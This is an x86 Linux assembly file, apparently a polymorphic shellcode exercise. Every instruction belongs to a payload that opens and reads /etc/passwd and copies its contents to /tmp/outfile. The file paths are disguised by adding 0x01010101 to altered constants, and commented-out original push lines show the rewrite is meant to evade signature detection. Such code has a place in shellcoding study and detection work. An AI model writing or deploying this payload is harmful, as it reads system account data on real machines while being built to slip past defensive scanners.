global _start
section .text
_start:
    xor eax,eax
    ;mov al,0x5
    ;xor ecx,ecx
    mov ecx,eax ; same as xoring
    push ecx
    ;push 0x64777373 
    add eax,0x01010101 ;same as dwss
    add eax,0x63767272
    push eax    
    xor eax,eax
    ;push 0x61702f63
    add eax,0x01010101
    add eax,0x606f2e62
    push eax
    xor eax,eax
    ;push 0x74652f2f 
    add eax,0x01010101 ; same as ap/c
    add eax,0x73642e2e
    push eax
    lea ebx,[esp +1]
    xor eax,eax
    mov al,0x5
    int 0x80

    mov ebx,eax
    ;mov al,0x3
    mov al,0x2
    inc al ; same as placing 3 into eax
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax


    xor ecx,ecx
    push ecx
    ;push 0x656c6966
    xor eax,eax
    add eax,0x01010101
    add eax,0x646b6865
    push eax
    xor eax,eax
    ;push 0x74756f2f
    ;xor eax,eax
    add eax,0x01010101
    add eax,0x73746e2e
    push eax
    ;xor eax,eax
    push 0x706d742f
    ;add eax,0x01010101
    ;add eax,0x6f6c732e
    ;push eax
    xor eax,eax
    push 0x5
    pop eax
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    ;mov al,0x1
    inc al ; increment to 1
    mov bl,0x5
    int 0x80
